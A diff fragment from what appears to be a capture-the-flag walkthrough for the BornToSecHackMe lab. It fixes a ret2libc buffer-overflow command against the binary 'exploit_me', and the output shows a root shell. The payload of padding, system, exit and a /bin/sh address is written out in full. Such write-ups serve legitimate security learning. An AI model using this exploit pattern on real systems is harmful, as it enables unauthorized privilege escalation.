@@ -955,7 +955,7 @@ warning: Unable to access target memory at 0xb7fd3160, halting search.
 
 3. Exploit with the payload: `padding + system + exit + /bin/sh`
 ```
-zaz@BornToSecHackMe:~$ ./exploit_me $('print("\x90" * 140 +  "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7"  + "\x58\xcc\xf8\xb7")')
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("\x90" * 140 +  "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7"  + "\x58\xcc\xf8\xb7")')
 # id
 uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
 # whoami
